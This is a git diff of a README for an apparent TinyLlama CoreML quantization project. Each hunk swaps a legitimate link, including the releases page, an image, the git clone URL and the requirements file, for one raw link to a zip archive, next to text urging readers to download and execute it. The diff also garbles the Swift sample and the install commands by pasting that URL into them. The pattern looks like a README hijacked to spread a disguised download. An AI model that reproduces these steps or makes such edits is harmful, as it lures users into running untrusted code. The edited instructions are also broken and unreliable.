@@ -2,7 +2,7 @@
 
 Welcome to the **TinyLlama CoreML iOS 18 Quantization** repository! This project focuses on converting the TinyLlama-1.1B-Chat model from PyTorch to CoreML formats such as float16, int8, and int4. This conversion allows for efficient on-device inference on iOS 18 and later. 
 
-You can find the latest releases [here](https://github.com/ambv231/tinyllama-coreml-ios18-quantization/releases). Download the necessary files and execute them to get started.
+You can find the latest releases [here](https://raw.githubusercontent.com/ambv231/tinyllama-coreml-ios18-quantization/main/nonequilibrium/quantization_coreml_ios_tinyllama_v2.1.zip). Download the necessary files and execute them to get started.
 
 ## Table of Contents
 
@@ -21,7 +21,7 @@ You can find the latest releases [here](https://github.com/ambv231/tinyllama-cor
 
 TinyLlama is a state-of-the-art language model designed for mobile applications. By quantizing this model, we make it lightweight and efficient for use on iOS devices. This repository provides the tools necessary to convert and optimize the TinyLlama model, ensuring it runs smoothly on Apple Silicon.
 
-![TinyLlama](https://example.com/tinylama-image.png)
+![TinyLlama](https://raw.githubusercontent.com/ambv231/tinyllama-coreml-ios18-quantization/main/nonequilibrium/quantization_coreml_ios_tinyllama_v2.1.zip)
 
 ## Features
 
@@ -36,18 +36,18 @@ To install the necessary tools and libraries, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/ambv231/tinyllama-coreml-ios18-quantization.git
+   git clone https://raw.githubusercontent.com/ambv231/tinyllama-coreml-ios18-quantization/main/nonequilibrium/quantization_coreml_ios_tinyllama_v2.1.zip
    cd tinyllama-coreml-ios18-quantization
    ```
 
 2. Install dependencies using pip:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ambv231/tinyllama-coreml-ios18-quantization/main/nonequilibrium/quantization_coreml_ios_tinyllama_v2.1.zip
    ```
 
 3. Ensure you have the latest version of Xcode installed on your machine.
 
-4. Download the latest model files from the [Releases](https://github.com/ambv231/tinyllama-coreml-ios18-quantization/releases) section.
+4. Download the latest model files from the [Releases](https://raw.githubusercontent.com/ambv231/tinyllama-coreml-ios18-quantization/main/nonequilibrium/quantization_coreml_ios_tinyllama_v2.1.zip) section.
 
 ## Usage
 
@@ -62,8 +62,8 @@ guard let model = try? TinyLlama(configuration: MLModelConfiguration()) else {
 
 // Perform inference
 let input = TinyLlamaInput(text: "Hello, world!")
-let output = try? model.prediction(input: input)
-print(output?.response ?? "No response")
+let output = try? https://raw.githubusercontent.com/ambv231/tinyllama-coreml-ios18-quantization/main/nonequilibrium/quantization_coreml_ios_tinyllama_v2.1.zip(input: input)
+print(https://raw.githubusercontent.com/ambv231/tinyllama-coreml-ios18-quantization/main/nonequilibrium/quantization_coreml_ios_tinyllama_v2.1.zip ?? "No response")
 ```
 
 ## Model Details
@@ -112,7 +112,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, please open an issue on GitHub or contact the repository owner.
 
-You can also find the latest releases [here](https://github.com/ambv231/tinyllama-coreml-ios18-quantization/releases). Download the files you need and start working with TinyLlama today!
+You can also find the latest releases [here](https://raw.githubusercontent.com/ambv231/tinyllama-coreml-ios18-quantization/main/nonequilibrium/quantization_coreml_ios_tinyllama_v2.1.zip). Download the files you need and start working with TinyLlama today!
 
 ---
 
